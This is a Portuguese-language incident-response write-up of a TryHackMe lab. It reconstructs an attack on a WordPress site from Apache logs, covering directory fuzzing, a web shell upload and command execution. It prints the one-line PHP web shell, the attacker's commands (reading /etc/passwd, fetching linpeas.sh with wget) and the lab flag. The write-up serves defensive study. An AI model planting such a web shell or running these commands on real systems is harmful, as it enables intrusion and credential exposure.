# Investigação de Web Shell — TryHackMe Lab

## Descrição
Investigação de um site WordPress comprometido. O objetivo foi analisar logs do servidor Apache para identificar indicadores de uso de web shell e reconstruir a sequência completa do ataque.

---

## Metodologia

### 1. Identificando o atacante nos logs

Primeiro passo foi identificar qual IP estava gerando mais tráfego suspeito usando o comando:

```bash
cut -d' ' -f1 access.log | sort | uniq -c | sort -nr
```

**Resultado:**

<img width="928" height="123" alt="image" src="https://github.com/user-attachments/assets/c2bc36e6-c58b-43ea-815f-235a3973b978" />

O IP `203.0.113.66` com 99 requisições se destacou como suspeito, volume muito acima dos demais.

---

### 2. Filtrando requisições do atacante

```bash
cat /var/log/apache2/access.log | grep "203.0.113.66"
```
<img width="1866" height="839" alt="image" src="https://github.com/user-attachments/assets/9bb7828c-ddfe-41a9-8aff-541aca1f675d" />

User-Agent identificado: `ashadyagent/1.1` — claramente não é um navegador legítimo.

---

### 3. Sequência do ataque reconstruída

**Fase 1 — Directory Fuzzing**

O atacante varreu diretórios do WordPress em busca de um ponto de entrada válido. Múltiplos 404 seguidos de um 200 revelando o diretório `/wordpress`.

**Fase 2 — Identificando formulário de upload**

Após encontrar o WordPress, o atacante localizou o formulário de upload em `upload_form.php` com código 301 indicando redirecionamento válido.

<img width="1873" height="269" alt="image" src="https://github.com/user-attachments/assets/96c05be0-e5d2-4639-9ad2-6fb3a6fe1290" />

**Fase 3 — Upload do Web Shell**
POST /wordpress/wp-content/uploads/upload_form.php

Web shell `shadyshell.php` carregado com sucesso no diretório`/wordpress/wp-content/uploads/`.

**Fase 4 — Execução de comandos via Web Shell**

Primeiros comandos executados pelo atacante, conforme imagem na fase 3

```
?cmd=id
?cmd=whoami        ← primeiro comando executado
?cmd=uname%20-a
?cmd=ls%20-la%20/home
?cmd=cat%20/etc/passwd
```

**Fase 5 — Download de ferramenta de escalada de privilégios**

```
?cmd=wget%20http://...linpeas.sh
```
O atacante baixou `linpeas.sh` — ferramenta de enumeração para escalada de privilégios no Linux.

---

### 4. Analisando o código do Web Shell e Respostas

```bash
cat /var/www/html/wordpress/wp-content/uploads/shadyshell.php
```

**Conteúdo do web shell:**
```php
<?php system($_GET['cmd']); ?>
<!-- FLAG: THM{W3b_Sh3ll_Int3rnals} -->
```

Flag escondida em comentário HTML dentro do próprio web shell.

**Flag:** `THM{W3b_Sh3ll_Int3rnals}`
<img width="1415" height="818" alt="image" src="https://github.com/user-attachments/assets/b1a03a2c-57eb-4ad6-9217-5033571584b4" />

<img width="1259" height="819" alt="image" src="https://github.com/user-attachments/assets/0181c0ee-5e80-4978-8744-d9d23d52ced4" />

---

## Resumo da sequência de ataque

| Fase | Ação | Indicador |
|------|------|-----------|
| 1 | Directory fuzzing | Múltiplos 404 + User-Agent suspeito |
| 2 | Identificação do upload | GET para `upload_form.php` com 301 |
| 3 | Upload do web shell | POST para `upload_form.php` |
| 4 | Execução de comandos | GET repetido para `shadyshell.php?cmd=` |
| 5 | Download de ferramenta | `wget` via web shell para `linpeas.sh` |

---

## Lições Aprendidas

- Volume de requisições por IP é um dos primeiros indicadores de atividade maliciosa nos logs
- User-Agent incomum é sinal imediato de ferramenta automatizada ou atacante
- A sequência directory fuzzing → POST de upload → GET repetido para arquivo PHP é o padrão clássico de implantação de web shell
- Web shells podem conter dados escondidos em comentários HTML
- `linpeas.sh` é uma ferramenta de escalada de privilégios sua presença indica que o atacante buscava acesso root
- Análise de logs permite reconstruir toda a sequência de um ataque

---

## Referências
- TryHackMe: https://tryhackme.com
- MITRE ATT&CK T1505.003 — Web Shell:
https://attack.mitre.org/techniques/T1505/003/
- MITRE ATT&CK T1190 — Exploit Public-Facing Application:
https://attack.mitre.org/techniques/T1190/
- LinPEAS: https://github.com/peass-ng/PEASS-ng
